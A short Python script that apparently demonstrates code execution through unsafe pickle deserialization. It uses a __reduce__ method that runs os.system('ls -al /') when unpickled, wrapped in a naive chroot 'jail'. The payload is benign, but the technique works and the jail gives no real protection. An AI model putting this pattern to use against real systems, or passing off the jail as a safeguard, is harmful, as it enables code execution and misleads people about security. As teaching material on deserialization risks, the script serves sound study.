import os
import pickle
from contextlib import contextmanager

class ShellSystemJail(object):
	
	def __reduce__(self):
		# this will list contents of root / folder
		return (os.system, ('ls -al /',))

@contextmanager
def system_jail():
	""" A simple chroot jail """
	os.chroot('safe_root/')
	yield
	os.chroot('/')

def serialize():
	with system_jail():
		shellcode = pickle.dumps(ShellSystemJail())
	return shellcode

def deserialize(exploit_code):
	with system_jail():
		pickle.loads(exploit_code)

if __name__ == '__main__':
	shellcode = serialize()
	deserialize(shellcode)
